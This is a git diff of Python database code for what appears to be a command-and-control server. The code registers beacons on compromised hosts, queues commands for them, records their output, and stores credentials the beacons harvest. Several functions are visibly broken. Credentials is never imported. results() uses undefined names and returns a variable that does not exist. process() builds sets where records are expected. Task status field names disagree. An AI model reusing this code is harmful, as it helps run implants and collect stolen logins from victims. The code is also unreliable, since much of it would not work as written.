@@ -1,8 +1,8 @@
+from app.functions_generic import Generic
+from app.models import Users, Commands, Macros, Beacons, BeaconHistory, Tasks, TaskResults
 import hashlib
 import mongoengine
-from app.functions_generic import Generic
-from app.models import Users, Commands, Macros, Beacons, BeaconHistory
-
+import json
 
 class Command:
     def create(name, command_type="default"):
@@ -103,34 +103,39 @@ class Macro:
         return result
 
 
-class Task:
-    def delete(task_id):
+
+class Result:
+    def store_creds(beacon_id, application, username, key, key_type):
         try:
-            task = Tasks.objects.get(id=task_id).delete()
-            result = {"result": "success", "data": "Successfully deleted task"}
+            credential = Credentials(
+                source_beacon=beacon_id,
+                source_command=application,
+                username=username,
+                key=key,
+                type=key_type,
+            ).save()
+            result = {"result": "success",
+                        "data": "Successfully added credentials to db"}
 
         except Exception as err:
-            result = {"result": "failed", "data": "Unable to delete task from database"}
+            result = {"result": "failed", "data": "Unable to save credentials"}
 
         return result
 
-    def create(beacon_id, task_name, cmd_input, task_type):
+    def store_result(beacon_id, task_id, command, output, magic_type):
         try:
-            new_task = Tasks(
+            taskoutput = TaskResults(
                 beacon_id=beacon_id,
-                type=task_type,
-                start_date=datetime.datetime.now(),
-            ).save()
+                task_id=task_id,
+                command=command
+            )
+            taskoutput.output.put(output, content_type=magic_type)
+            taskoutput.save()
+            result = {"result": "success", "data": "Succesfully inserted task result"}
 
-            result = {"result": "success", "data": {"taskid": task_id,
-                      "beacon": beacon_id}}
-
-        except mongoengine.errors.NotUniqueError:
-            result = {"result": "failed", "message": "Task already exists"}
-
-        except Exception as e:
-            result = {"result": "failed",
-                      "data": "Unable to update/write database"}
+        except Exception as err:
+            print(err)
+            result = {"result": "failed", "data": "Failed to save task results"}
 
         return result
 
@@ -143,29 +148,94 @@ class Task:
         except mongoengine.errors.DoesNotExist:
             result = {"result":"failed", "data":"Beacon does not exist"}
 
+        except Exception as err:
+            result = {"result": "failed", "data": "Failed to change timer in DB"}
+
+        return result
+
+class Task:
+    def get(task_id):
+        try:
+            task_details = Tasks.objects.get(id=task_id)
+            result = json.loads(task_details.to_json())
+
+        except mongoengine.errors.DoesNotExist:
+            result = {"result":"failed", "data":"Task does not exist"}
+
+        except Exception as err:
+            result = {"result": "failed", "data": "Unable to delete task from database"}
+
+        return result
+
+    def delete(task_id):
+        try:
+            task = Tasks.objects.get(id=task_id).delete()
+            result = {"result": "success", "data": "Successfully deleted task"}
+
+        except mongoengine.errors.DoesNotExist:
+            result = {"result":"failed", "data":"Task does not exist"}
+
+        except Exception as err:
+            result = {"result": "failed", "data": "Unable to delete task from database"}
+
+        return result
+
+    def create(beacon_id, task_type, task, commands):
+        try:
+            new_task = Tasks(
+                beacon_id=beacon_id,
+                type=task_type,
+                task=task,
+                commands=commands
+            ).save()
+
+            result = {"result": "success", "data": {"task_id": str(new_task.id)}}
+
+        except mongoengine.errors.ValidationError:
+            result = {"result": "failed", "data": "Task requires explicit commands"}
+
+        except Exception as err:
+            result = {"result": "failed", "data": "Unable to create task"}
+
         return result
 
 
-    def store_result(beacon_id, task_id, task_end, task_out, task_mime):
+    def change_state(task_id, state):
         try:
-            taskoutput = TaskResults(
-                beacon_id=beacon_id,
-                task_id=task_id,
-                end_date=task_end,
-            )
-            taskoutput.output.put(task_out, content_type=task_mime)
-            taskoutput.save()
-            result = {"result": "success",
-                      "data": "Succesfully inserted task result"}
+            get_tasks = Tasks.objects(task_id=task_id)
+            get_tasks.update(set__task_status=state)
+            result = {"result":"success", "data":"Changed task state"}
 
-        except Exception as e:
-            result = {"result": "failed", "data": "Failed to save task results"}
+        except mongoengine.errors.DoesNotExist:
+            result = {"result":"failed", "data":"No tasks available"}
+
+        except Exception as err:
+            result = {"result":"failed", "data":"Unexpected error"}
+
+        return result
+
+
+    def process(beacon_id, post_data, beacon_ip):
+        try:
+            result = {"result":"success", "tasks":[]}
+            get_tasks = Tasks.objects(beacon_id=beacon_id, task_status="Open")
+            for task in get_tasks:
+                commands_list = task.commands
+                for command in commands_list:
+                    result['tasks'].append({command['name'], command['input'], command['timer']})
+                task.update(set__taskStatus="Processing")
+
+        except mongoengine.errors.DoesNotExist:
+            result = {"result":"failed", "data":"No tasks available"}
+
+        except Exception as err:
+            result = {"result":"failed", "data":"Unexpected error"}
 
         return result
 
 
 class Beacon:
-    def create(beacon_id, beacon_os, username, timer, hostname, beacon_data, remote_ip=""):
+    def create(beacon_id, beacon_os, username, timer, hostname, beacon_data, working_dir, remote_ip=""):
         try:
             beacon_object = Beacons(
                 beacon_id=beacon_id,
@@ -173,6 +243,7 @@ class Beacon:
                 data=beacon_data,
                 hostname=hostname,
                 username=username,
+                working_dir=working_dir,
                 remote_ip=remote_ip
             ).save()
 
@@ -187,7 +258,7 @@ class Beacon:
 
         return result
 
-    def pulse(beacon_id, platform, username, hostname, data, remote_ip):
+    def pulse(beacon_id, platform, username, hostname, data, working_dir, remote_ip):
         try:
             history_object = BeaconHistory(
                 beacon_id=beacon_id,
@@ -195,33 +266,35 @@ class Beacon:
                 hostname=hostname,
                 data=data,
                 platform=platform,
+                working_dir=working_dir,
                 username=username,
             ).save()
 
-            result = {"result": "success",
-                      "data": "Beacon history succesfully added"}
+            result = {"result": "success", "data": "Beacon history succesfully added"}
 
         except Exception as err:
-            print(err)
-
             result = {"result": "failed",
                       "data": "Unable to add beacon history to database"}
 
         return result
 
-    def store_creds(beacon_id, application, username, key, key_type):
+    def results(beacon_id, task_id):
         try:
-            credential = Credentials(
-                source_beacon=beacon_id,
-                source_command=application,
-                username=username,
-                key=key,
-                type=key_type,
-            ).save()
-            result = {"result": "success",
-                      "data": "Successfully added credentials to db"}
+            pipeline = [{"$lookup": {"from": "task_results", "localField": "_id","foreignField": "task_id", "as": "taskdetails"}}]
+            task_aggregation = TaskResults.objects(beacon_id=beacon_id, task_id=task_id).aggregate(*pipeline)
+            for output in task_aggregation:
+                result = {"beacon_id":output.beacon_id, "type":output.type, "task":output.task, "start_date":str(output.start_date),
+                    "task_status":output.task_status, "commands":output.commands, "taskdetails":[]}
+                for details in output.taskdetails:
+                    if details.content_type == "text/plain":
+                        output_url = "/api/result/%s" %(beacon['taskId'])
+                        
+                    detail = {"id": str(details.id), "end_date":str(output.end_date),}
+                    result['taskdetails'].append()
 
-        except Exception as err:
-            result = {"result": "failed", "data": "Unable to save credentials"}
+        except mongoengine.errors.DoesNotExist:
+            result = {"result":"failed", "data":"No tasks available"}
 
-        return result
+        return results
+
+ 
